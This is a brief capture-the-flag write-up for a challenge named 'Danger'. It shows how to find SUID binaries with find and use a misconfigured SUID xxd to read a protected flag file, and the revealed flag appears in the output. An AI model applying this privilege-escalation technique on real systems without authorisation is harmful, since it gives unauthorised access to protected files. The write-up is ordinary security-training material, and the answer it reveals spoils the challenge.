#### Danger
- points earned: 50

#### Where's the flag?
- the flag is located in `/home/danger` but has rwx for user `noaccess` group `noaccess`
```bash
Danger@b25b933450d9:~$ ls -l  
total 4  
-rwx------ 1 noaccess noaccess 28 Nov 17 04:44 flag.txt
```
- so the idea of this is to figure out how to read the file
#### Solution

- search for suid and sgid files
	```bash
	Danger@8c354abef258:~$ find / -perm /6000 2>/dev/null  
	/usr/sbin/pam_extrausers_chkpwd  
	/usr/sbin/unix_chkpwd  
	/usr/bin/passwd  
	/usr/bin/mount  
	/usr/bin/su  
	/usr/bin/chfn  
	/usr/bin/gpasswd  
	/usr/bin/chage  
	/usr/bin/umount  
	/usr/bin/chsh  
	/usr/bin/newgrp  
	/usr/bin/expiry  
	/usr/bin/xxd 
	/usr/bin/ssh-agent  
	/usr/lib/openssh/ssh-keysign  
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
	/usr/local/lib/python3.8  
	/usr/local/lib/python3.8/dist-packages  
	/var/log/journal  
	/var/mail  
	/var/local  
	```
	- `/usr/bin/xxd ` doesn't belong here
- investigate xxd
	```bash
	Danger@b25b933450d9:~$ ls -l /usr/bin/xxd    
	-rwsr-xr-x 1 noaccess noaccess 18712 Apr  2  2025 /usr/bin/xxd
	```
	- suid file as noaccess
- use xxd to read the flag
	```bash
	Danger@8c354abef258:~$ /usr/bin/xxd flag.txt    
	00000000: 3078 6675 6e7b 4561 7379 5f41 6363 6573  0xfun{Easy_Acces  
	00000010: 735f 4772 616e 7465 6421 7d0a            s_Granted!}.
	```
